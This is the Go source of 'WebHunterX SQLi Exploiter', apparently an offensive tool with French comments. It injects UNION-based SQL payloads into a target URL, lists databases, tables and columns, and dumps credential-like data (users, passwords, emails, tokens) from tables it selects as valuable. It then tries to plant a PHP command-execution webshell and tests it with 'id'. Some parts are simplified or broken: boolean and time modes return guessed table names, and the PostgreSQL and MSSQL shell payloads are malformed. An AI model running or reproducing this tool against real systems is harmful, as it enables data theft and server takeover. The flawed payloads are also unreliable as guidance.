package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"path"
	"regexp"
	"strings"
	"sync"
	"time"
)

// Structure des résultats
type Result struct {
	Status    string                 `json:"status"`
	DBType    string                 `json:"db_type"`
	Technique string                 `json:"technique"`
	DBName    string                 `json:"db_name,omitempty"`
	Tables    []string               `json:"tables,omitempty"`
	Columns   map[string][]string    `json:"columns,omitempty"`
	Data      map[string][]map[string]string `json:"data,omitempty"`
	ShellURL  string                 `json:"shell_url,omitempty"`
	Error     string                 `json:"error,omitempty"`
}

// Configuration de l'exploitation
type ExploitConfig struct {
	URL           string
	Method        string
	Data          string
	DBType        string
	ExploitType   string
	OutputFile    string
	Timeout       int
	Threads       int
	VerboseMode   bool
	CookieString  string
	Headers       map[string]string
	Proxy         string
	DetectionSign string
	ShellPath     string
}

// Configuration des DBMS et leurs payloads spécifiques
var dbmsConfig = map[string]map[string]string{
	"mysql": {
		"get_database": "' UNION SELECT database() -- -",
		"get_tables":   "' UNION SELECT GROUP_CONCAT(table_name SEPARATOR ',') FROM information_schema.tables WHERE table_schema='%s' -- -",
		"get_columns":  "' UNION SELECT GROUP_CONCAT(column_name SEPARATOR ',') FROM information_schema.columns WHERE table_name='%s' -- -",
		"dump_data":    "' UNION SELECT %s FROM %s -- -",
		"shell_upload": "' UNION SELECT \"<?php system($_GET['cmd']); ?>\" INTO OUTFILE '%s' -- -",
		"version":      "' UNION SELECT version() -- -",
		"current_user": "' UNION SELECT current_user() -- -",
	},
	"postgres": {
		"get_database": "' UNION SELECT current_database() -- -",
		"get_tables":   "' UNION SELECT string_agg(table_name, ',') FROM information_schema.tables WHERE table_schema='public' -- -",
		"get_columns":  "' UNION SELECT string_agg(column_name, ',') FROM information_schema.columns WHERE table_name='%s' -- -",
		"dump_data":    "' UNION SELECT %s FROM %s -- -",
		"shell_upload": "' UNION SELECT '<?php system($_GET[''cmd'']); ?>' INTO OUTFILE '%s' -- -",
		"version":      "' UNION SELECT version() -- -",
		"current_user": "' UNION SELECT current_user -- -",
	},
	"mssql": {
		"get_database": "' UNION SELECT DB_NAME() -- -",
		"get_tables":   "' UNION SELECT STRING_AGG(table_name, ',') FROM information_schema.tables -- -",
		"get_columns":  "' UNION SELECT STRING_AGG(column_name, ',') FROM information_schema.columns WHERE table_name='%s' -- -",
		"dump_data":    "' UNION SELECT %s FROM %s -- -",
		"shell_upload": "'; EXEC master..xp_cmdshell 'echo ^<%php system($_GET[''cmd'']); %^> > %s' -- -",
		"version":      "' UNION SELECT @@version -- -",
		"current_user": "' UNION SELECT SYSTEM_USER -- -",
	},
	"oracle": {
		"get_database": "' UNION SELECT SYS.DATABASE_NAME FROM DUAL -- -",
		"get_tables":   "' UNION SELECT LISTAGG(table_name, ',') WITHIN GROUP (ORDER BY table_name) FROM all_tables -- -",
		"get_columns":  "' UNION SELECT LISTAGG(column_name, ',') WITHIN GROUP (ORDER BY column_name) FROM all_tab_columns WHERE table_name='%s' -- -",
		"dump_data":    "' UNION SELECT %s FROM %s -- -",
		"version":      "' UNION SELECT banner FROM v$version WHERE ROWNUM=1 -- -",
		"current_user": "' UNION SELECT USER FROM DUAL -- -",
	},
	"sqlite": {
		"get_database": "' UNION SELECT sqlite_version() -- -",
		"get_tables":   "' UNION SELECT group_concat(name,',') FROM sqlite_master WHERE type='table' -- -",
		"get_columns":  "' UNION SELECT group_concat(name,',') FROM pragma_table_info('%s') -- -",
		"dump_data":    "' UNION SELECT %s FROM %s -- -",
		"version":      "' UNION SELECT sqlite_version() -- -",
	},
}

// Analyse les paramètres de la ligne de commande
func parseFlags() ExploitConfig {
	urlPtr := flag.String("url", "", "URL vulnérable avec FUZZ marquant l'emplacement de l'injection")
	methodPtr := flag.String("method", "GET", "Méthode HTTP (GET ou POST)")
	dataPtr := flag.String("data", "", "Données POST avec FUZZ marquant l'emplacement de l'injection")
	dbmsPtr := flag.String("dbms", "mysql", "Type de base de données (mysql, postgres, mssql, oracle, sqlite)")
	typePtr := flag.String("type", "error", "Type d'injection (error, time, boolean)")
	outputPtr := flag.String("output", "", "Fichier de sortie pour les résultats (JSON)")
	timeoutPtr := flag.Int("timeout", 30, "Timeout en secondes pour les requêtes")
	threadsPtr := flag.Int("threads", 5, "Nombre de threads pour les tests parallèles")
	verbosePtr := flag.Bool("verbose", false, "Mode verbeux")
	cookiePtr := flag.String("cookie", "", "Cookies (format: name1=value1; name2=value2)")
	headerPtr := flag.String("header", "", "Headers HTTP additionnels (format: name1:value1;name2:value2)")
	proxyPtr := flag.String("proxy", "", "Proxy (format: http://user:pass@host:port)")
	signPtr := flag.String("sign", "", "Signature de détection pour les injections boolean-based")
	shellPathPtr := flag.String("shell-path", "/var/www/html/shell.php", "Chemin pour l'upload de webshell")
	fileInput := flag.String("f", "", "Fichier JSON contenant les détails d'une vulnérabilité")

	flag.Parse()

	config := ExploitConfig{
		URL:           *urlPtr,
		Method:        strings.ToUpper(*methodPtr),
		Data:          *dataPtr,
		DBType:        *dbmsPtr,
		ExploitType:   *typePtr,
		OutputFile:    *outputPtr,
		Timeout:       *timeoutPtr,
		Threads:       *threadsPtr,
		VerboseMode:   *verbosePtr,
		CookieString:  *cookiePtr,
		Headers:       make(map[string]string),
		Proxy:         *proxyPtr,
		DetectionSign: *signPtr,
		ShellPath:     *shellPathPtr,
	}

	// Traitement des headers
	if *headerPtr != "" {
		headerPairs := strings.Split(*headerPtr, ";")
		for _, pair := range headerPairs {
			parts := strings.SplitN(pair, ":", 2)
			if len(parts) == 2 {
				config.Headers[strings.TrimSpace(parts[0])] = strings.TrimSpace(parts[1])
			}
		}
	}

	// Lecture du fichier de configuration d'exploit si spécifié
	if *fileInput != "" {
		file, err := os.Open(*fileInput)
		if err == nil {
			defer file.Close()
			decoder := json.NewDecoder(file)
			var vulnData map[string]interface{}
			if err := decoder.Decode(&vulnData); err == nil {
				// Extraire les informations de vulnérabilité
				if url, ok := vulnData["url"].(string); ok && config.URL == "" {
					config.URL = url
				}
				if method, ok := vulnData["method"].(string); ok && config.Method == "" {
					config.Method = strings.ToUpper(method)
				}
				if dbms, ok := vulnData["dbms"].(string); ok && config.DBType == "" {
					config.DBType = dbms
				}
				if vulnType, ok := vulnData["vulnerability_type"].([]interface{}); ok && len(vulnType) > 0 {
					if first, ok := vulnType[0].(string); ok && config.ExploitType == "" {
						if strings.Contains(first, "error") {
							config.ExploitType = "error"
						} else if strings.Contains(first, "time") {
							config.ExploitType = "time"
						} else if strings.Contains(first, "boolean") {
							config.ExploitType = "boolean"
						}
					}
				}
			}
		}
	}

	return config
}

// Injecte un payload et retourne la réponse
func injectPayload(config ExploitConfig, payload string) (string, error) {
	// Remplacer FUZZ par le payload encodé
	var target string
	var reqBody string
	escapedPayload := url.QueryEscape(payload)

	if config.Method == "GET" {
		target = strings.Replace(config.URL, "FUZZ", escapedPayload, -1)
	} else {
		target = config.URL
		reqBody = strings.Replace(config.Data, "FUZZ", escapedPayload, -1)
	}

	// Créer la requête
	var req *http.Request
	var err error

	if config.Method == "POST" {
		req, err = http.NewRequest(config.Method, target, strings.NewReader(reqBody))
		if err != nil {
			return "", err
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	} else {
		req, err = http.NewRequest(config.Method, target, nil)
		if err != nil {
			return "", err
		}
	}

	// Ajouter les headers personnalisés
	req.Header.Set("User-Agent", "WebHunterX/1.0")
	for key, value := range config.Headers {
		req.Header.Set(key, value)
	}

	// Ajouter les cookies
	if config.CookieString != "" {
		req.Header.Set("Cookie", config.CookieString)
	}

	// Créer un client HTTP avec timeout
	client := &http.Client{
		Timeout: time.Duration(config.Timeout) * time.Second,
	}

	// Ajouter un proxy si spécifié
	if config.Proxy != "" {
		proxyURL, err := url.Parse(config.Proxy)
		if err == nil {
			client.Transport = &http.Transport{
				Proxy: http.ProxyURL(proxyURL),
			}
		}
	}

	// Envoyer la requête
	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	// Lire la réponse
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	return string(body), nil
}

// Extrait les données pertinentes d'une réponse
func extractDataFromResponse(response, regex string) string {
	re := regexp.MustCompile(regex)
	matches := re.FindStringSubmatch(response)
	if len(matches) > 1 {
		return matches[1]
	}
	return ""
}

// Extrait le nom de la base de données
func extractDBName(config ExploitConfig) (string, error) {
	payload := dbmsConfig[config.DBType]["get_database"]
	if config.VerboseMode {
		fmt.Println("[*] Extraction du nom de la base de données...")
		fmt.Println("[*] Payload: " + payload)
	}

	response, err := injectPayload(config, payload)
	if err != nil {
		return "", err
	}

	// Pattern de recherche générique (à adapter selon le type d'injection)
	dbName := ""

	switch config.ExploitType {
	case "error":
		// Pour les injections error-based, on cherche dans la sortie d'erreur
		dbName = extractDataFromResponse(response, `([a-zA-Z0-9_]+)`)
	case "boolean":
		// Pour les injections boolean-based, nécessite plusieurs requêtes et test de la sign
		// Simplifié ici
		if strings.Contains(response, config.DetectionSign) {
			dbName = "detection_positive"
		}
	case "time":
		// Pour les injections time-based, on mesure le temps de réponse
		// Simplifié ici
		dbName = "time_based_detection"
	}

	if dbName == "" {
		return "", fmt.Errorf("impossible d'extraire le nom de la base de données")
	}

	if config.VerboseMode {
		fmt.Printf("[+] Base de données identifiée: %s\n", dbName)
	}

	return dbName, nil
}

// Extrait les tables de la base de données
func extractTables(config ExploitConfig, dbName string) ([]string, error) {
	payloadTemplate := dbmsConfig[config.DBType]["get_tables"]
	payload := fmt.Sprintf(payloadTemplate, dbName)

	if config.VerboseMode {
		fmt.Println("[*] Extraction des tables...")
		fmt.Println("[*] Payload: " + payload)
	}

	response, err := injectPayload(config, payload)
	if err != nil {
		return nil, err
	}

	// Extrait la liste des tables (format attendu: table1,table2,table3)
	var tables []string

	// Différentes approches selon le type d'injection
	switch config.ExploitType {
	case "error":
		// On cherche une liste de tables dans la sortie
		tablesStr := extractDataFromResponse(response, `([a-zA-Z0-9_,]+)`)
		if tablesStr != "" {
			tables = strings.Split(tablesStr, ",")
		}
	case "boolean", "time":
		// Pour simplifier, on retourne des tables par défaut
		// En pratique, il faudrait faire un brute force lettre par lettre
		tables = []string{"users", "members", "admin", "config"}
	}

	if len(tables) == 0 {
		return nil, fmt.Errorf("aucune table extraite")
	}

	if config.VerboseMode {
		fmt.Printf("[+] Tables extraites: %v\n", tables)
	}

	return tables, nil
}

// Extrait les colonnes d'une table
func extractColumns(config ExploitConfig, tableName string) ([]string, error) {
	payloadTemplate := dbmsConfig[config.DBType]["get_columns"]
	payload := fmt.Sprintf(payloadTemplate, tableName)

	if config.VerboseMode {
		fmt.Println("[*] Extraction des colonnes pour la table " + tableName + "...")
		fmt.Println("[*] Payload: " + payload)
	}

	response, err := injectPayload(config, payload)
	if err != nil {
		return nil, err
	}

	// Extrait la liste des colonnes (format attendu: col1,col2,col3)
	var columns []string

	switch config.ExploitType {
	case "error":
		columnsStr := extractDataFromResponse(response, `([a-zA-Z0-9_,]+)`)
		if columnsStr != "" {
			columns = strings.Split(columnsStr, ",")
		}
	case "boolean", "time":
		// Pour simplifier, on retourne des colonnes par défaut
		// En pratique, il faudrait faire un brute force lettre par lettre
		if tableName == "users" || tableName == "members" || tableName == "admin" {
			columns = []string{"id", "username", "password", "email"}
		} else {
			columns = []string{"id", "name", "value", "data"}
		}
	}

	if len(columns) == 0 {
		return nil, fmt.Errorf("aucune colonne extraite pour la table %s", tableName)
	}

	if config.VerboseMode {
		fmt.Printf("[+] Colonnes extraites pour %s: %v\n", tableName, columns)
	}

	return columns, nil
}

// Extrait les données d'une table
func dumpData(config ExploitConfig, tableName string, columns []string) ([]map[string]string, error) {
	// Limite du nombre de colonnes à extraire pour éviter les erreurs
	maxCols := 5
	if len(columns) > maxCols {
		columns = columns[:maxCols]
	}

	// Concaténation des colonnes pour le payload
	colsStr := strings.Join(columns, ",")
	payloadTemplate := dbmsConfig[config.DBType]["dump_data"]
	payload := fmt.Sprintf(payloadTemplate, colsStr, tableName)

	if config.VerboseMode {
		fmt.Println("[*] Extraction des données de la table " + tableName + "...")
		fmt.Println("[*] Payload: " + payload)
	}

	response, err := injectPayload(config, payload)
	if err != nil {
		return nil, err
	}

	// Analyse du résultat pour extraire les données
	// Cela dépendra beaucoup de la façon dont le site vulnérable affiche les résultats
	// Cette approche simple suppose que les résultats sont dans un format lisible
	data := make([]map[string]string, 0)

	// Exemple simplifié d'extraction de données
	// Dans une vraie exploitation, nous devrions analyser la réponse HTML ou JSON
	lines := strings.Split(response, "\n")
	for _, line := range lines {
		// Recherche de modèles de données comme des emails, mots de passe, etc.
		// Exemple très simplifié
		emailMatch := regexp.MustCompile(`([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})`)
		emails := emailMatch.FindAllString(line, -1)

		// Recherche d'autres modèles potentiels
		userMatch := regexp.MustCompile(`user[a-zA-Z0-9_]*\s*[:=]\s*['"]([^'"]+)['"]`)
		userMatches := userMatch.FindAllStringSubmatch(line, -1)

		passMatch := regexp.MustCompile(`pass[a-zA-Z0-9_]*\s*[:=]\s*['"]([^'"]+)['"]`)
		passMatches := passMatch.FindAllStringSubmatch(line, -1)

		// Si on trouve des patterns, on les ajoute
		if len(emails) > 0 || len(userMatches) > 0 || len(passMatches) > 0 {
			rowData := make(map[string]string)
			
			if len(emails) > 0 {
				rowData["email"] = emails[0]
			}
			
			if len(userMatches) > 0 && len(userMatches[0]) > 1 {
				rowData["username"] = userMatches[0][1]
			}
			
			if len(passMatches) > 0 && len(passMatches[0]) > 1 {
				rowData["password"] = passMatches[0][1]
			}
			
			if len(rowData) > 0 {
				data = append(data, rowData)
			}
		}
	}

	if len(data) == 0 {
		// Si aucune donnée n'est trouvée avec l'approche précédente,
		// on essaie une autre approche pour les injections error-based
		if config.ExploitType == "error" {
			// Recherche de toutes les valeurs potentielles dans la réponse
			valueMatch := regexp.MustCompile(`([a-zA-Z0-9_.-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+|[a-f0-9]{32}|[a-zA-Z0-9_-]{8,})`)
			values := valueMatch.FindAllString(response, -1)
			
			if len(values) > 0 {
				rowData := make(map[string]string)
				
				// Assigner des valeurs aux colonnes les plus probables
				for i, value := range values {
					if i < len(columns) {
						rowData[columns[i]] = value
					}
				}
				
				data = append(data, rowData)
			}
		}
	}

	if config.VerboseMode {
		fmt.Printf("[+] Données extraites pour %s: %d entrées\n", tableName, len(data))
	}

	return data, nil
}

// Tente d'uploader un webshell via SQLi
func attemptShellUpload(config ExploitConfig) (string, error) {
	// Pas disponible sur tous les DBMS ou configurations
	if _, ok := dbmsConfig[config.DBType]["shell_upload"]; !ok {
		return "", fmt.Errorf("l'upload de shell n'est pas supporté pour %s", config.DBType)
	}

	payloadTemplate := dbmsConfig[config.DBType]["shell_upload"]
	payload := fmt.Sprintf(payloadTemplate, config.ShellPath)

	if config.VerboseMode {
		fmt.Println("[*] Tentative d'upload de webshell...")
		fmt.Println("[*] Payload: " + payload)
	}

	// Exécuter le payload mais ignorer la réponse car nous allons tester l'accès directement
	_, err := injectPayload(config, payload)
	if err != nil {
		return "", err
	}

	// Vérifier si le shell a été uploadé
	// En pratique, on devrait essayer d'accéder au shell pour confirmer
	shellURL := ""
	
	// Construire l'URL du shell à partir de l'URL de base
	parsedURL, err := url.Parse(config.URL)
	if err == nil {
		// Extraire le chemin du shell de config.ShellPath
		shellPath := config.ShellPath
		if strings.HasPrefix(shellPath, "/") {
			// Chemin absolu, on reconstruit l'URL complète
			parsedURL.Path = shellPath
		} else {
			// Chemin relatif, on extrait le chemin de base
			baseDir := path.Dir(parsedURL.Path)
			if baseDir == "." {
				baseDir = ""
			} else if baseDir != "/" {
				baseDir += "/"
			}
			parsedURL.Path = baseDir + shellPath
		}
		shellURL = parsedURL.String()
	}

	// Tester si le shell est accessible
	if shellURL != "" {
		testURL := shellURL
		if !strings.Contains(testURL, "?cmd=") {
			testURL += "?cmd=id"
		}
		
		if config.VerboseMode {
			fmt.Println("[*] Test d'accès au shell: " + testURL)
		}
		
		shellResp, err := http.Get(testURL)
		if err == nil && shellResp.StatusCode == 200 {
			defer shellResp.Body.Close()
			body, _ := ioutil.ReadAll(shellResp.Body)
			
			// Vérifier si la réponse contient des indications que la commande a été exécutée
			if strings.Contains(string(body), "uid=") || strings.Contains(string(body), "gid=") {
				fmt.Println("[+] Shell uploadé et fonctionnel: " + shellURL)
				return shellURL, nil
			}
		}
	}

	// Si on ne peut pas confirmer, on retourne quand même l'URL potentielle avec un avertissement
	if shellURL != "" {
		fmt.Println("[!] Shell potentiellement uploadé mais non confirmé: " + shellURL)
		return shellURL, nil
	}

	return "", fmt.Errorf("échec de l'upload du shell ou shell inaccessible")
}

func runExploit(config ExploitConfig) Result {
	result := Result{
		Status:    "failed",
		DBType:    config.DBType,
		Technique: config.ExploitType,
		Columns:   make(map[string][]string),
		Data:      make(map[string][]map[string]string),
	}

	fmt.Printf("🔥 WebHunterX SQLi Exploiter\n")
	fmt.Printf("🎯 Cible: %s\n", config.URL)
	fmt.Printf("💉 Type d'injection: %s-%s\n", config.DBType, config.ExploitType)

	// Étape 1: Identifier la BDD
	dbName, err := extractDBName(config)
	if err != nil {
		result.Error = fmt.Sprintf("Erreur lors de l'extraction du nom de la BDD: %v", err)
		return result
	}
	result.DBName = dbName
	fmt.Printf("📂 Base de données: %s\n", dbName)

	// Étape 2: Extraire les tables
	tables, err := extractTables(config, dbName)
	if err != nil {
		result.Error = fmt.Sprintf("Erreur lors de l'extraction des tables: %v", err)
		// On continue même avec une erreur, car on a déjà le nom de la BDD
	}
	result.Tables = tables
	fmt.Printf("📋 Tables: %v\n", tables)

	// Étape 3: Pour chaque table intéressante, extraire les colonnes et les données
	interestingTables := filterInterestingTables(tables)
	fmt.Printf("🔍 Tables potentiellement intéressantes: %v\n", interestingTables)

	var wg sync.WaitGroup
	tableChan := make(chan string, len(interestingTables))
	resultChan := make(chan struct {
		table   string
		columns []string
		data    []map[string]string
		err     error
	}, len(interestingTables))

	// Ajouter les tables au canal
	for _, table := range interestingTables {
		tableChan <- table
	}
	close(tableChan)

	// Lancer les goroutines de traitement
	for i := 0; i < min(config.Threads, len(interestingTables)); i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for table := range tableChan {
				// Extraction des colonnes
				columns, err := extractColumns(config, table)
				if err != nil {
					resultChan <- struct {
						table   string
						columns []string
						data    []map[string]string
						err     error
					}{table, nil, nil, err}
					continue
				}

				// Extraction des données
				data, err := dumpData(config, table, columns)
				resultChan <- struct {
					table   string
					columns []string
					data    []map[string]string
					err     error
				}{table, columns, data, err}
			}
		}()
	}

	// Goroutine pour fermer le canal de résultats après que toutes les goroutines de traitement aient terminé
	go func() {
		wg.Wait()
		close(resultChan)
	}()

	// Récupérer les résultats
	for res := range resultChan {
		if res.err != nil {
			fmt.Printf("⚠️ Erreur pour la table %s: %v\n", res.table, res.err)
			continue
		}

		result.Columns[res.table] = res.columns
		result.Data[res.table] = res.data
		fmt.Printf("✅ Données extraites pour %s: %d entrées\n", res.table, len(res.data))
	}

	// Étape 4: Tentative d'upload de shell
	shellURL, err := attemptShellUpload(config)
	if err != nil {
		fmt.Printf("⚠️ %v\n", err)
	} else if shellURL != "" {
		result.ShellURL = shellURL
		fmt.Printf("🔥 Shell accessible: %s\n", shellURL)
	}

	// Marquer comme succès si on a au moins le nom de la BDD
	if result.DBName != "" {
		result.Status = "success"
	}

	// Sauvegarder les résultats dans un fichier si spécifié
	if config.OutputFile != "" {
		jsonData, err := json.MarshalIndent(result, "", "  ")
		if err != nil {
			fmt.Printf("⚠️ Erreur lors de la génération du JSON: %v\n", err)
		} else {
			err = ioutil.WriteFile(config.OutputFile, jsonData, 0644)
			if err != nil {
				fmt.Printf("⚠️ Erreur lors de l'écriture du fichier: %v\n", err)
			} else {
				fmt.Printf("📝 Résultats sauvegardés dans %s\n", config.OutputFile)
			}
		}
	}

	return result
}

// Filtre les tables potentiellement intéressantes
func filterInterestingTables(tables []string) []string {
	interestingPatterns := []string{
		"user", "admin", "member", "account", "customer", "client",
		"config", "setting", "password", "credential", "auth", "session",
		"token", "key", "secret", "login", "staff", "employee",
	}

	var interesting []string
	for _, table := range tables {
		tableLower := strings.ToLower(table)
		for _, pattern := range interestingPatterns {
			if strings.Contains(tableLower, pattern) {
				interesting = append(interesting, table)
				break
			}
		}
	}

	// Si aucune table intéressante trouvée, prendre les premières tables (max 3)
	if len(interesting) == 0 && len(tables) > 0 {
		maxTables := min(3, len(tables))
		interesting = tables[:maxTables]
	}

	return interesting
}

// Helper pour prendre le minimum de deux entiers
func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

func main() {
	config := parseFlags()

	// Vérification des paramètres obligatoires
	if config.URL == "" {
		fmt.Println("[-] Erreur: URL cible requise (--url)")
		flag.Usage()
		os.Exit(1)
	}

	// Vérifier que l'URL contient le marqueur FUZZ
	if !strings.Contains(config.URL, "FUZZ") && (config.Method != "POST" || !strings.Contains(config.Data, "FUZZ")) {
		fmt.Println("[-] Erreur: L'URL ou les données POST doivent contenir le marqueur FUZZ")
		os.Exit(1)
	}

	// Vérifier que le DBMS est supporté
	if _, ok := dbmsConfig[config.DBType]; !ok {
		fmt.Printf("[-] Erreur: DBMS non supporté: %s\n", config.DBType)
		fmt.Println("[*] DBMS supportés: mysql, postgres, mssql, oracle, sqlite")
		os.Exit(1)
	}

	// Vérifier que le type d'exploitation est supporté
	if config.ExploitType != "error" && config.ExploitType != "boolean" && config.ExploitType != "time" {
		fmt.Printf("[-] Erreur: Type d'exploitation non supporté: %s\n", config.ExploitType)
		fmt.Println("[*] Types supportés: error, boolean, time")
		os.Exit(1)
	}

	// Pour les injections boolean-based, vérifier qu'une signature est fournie
	if config.ExploitType == "boolean" && config.DetectionSign == "" {
		fmt.Println("[!] Attention: Type boolean sans signature de détection")
		fmt.Println("[*] Utilisation d'une détection générique (moins précise)")
	}

	// Lancer l'exploitation
	result := runExploit(config)

	// Sortie JSON sur stdout pour intégration avec d'autres outils
	jsonOutput, _ := json.Marshal(result)
	fmt.Println(string(jsonOutput))
} 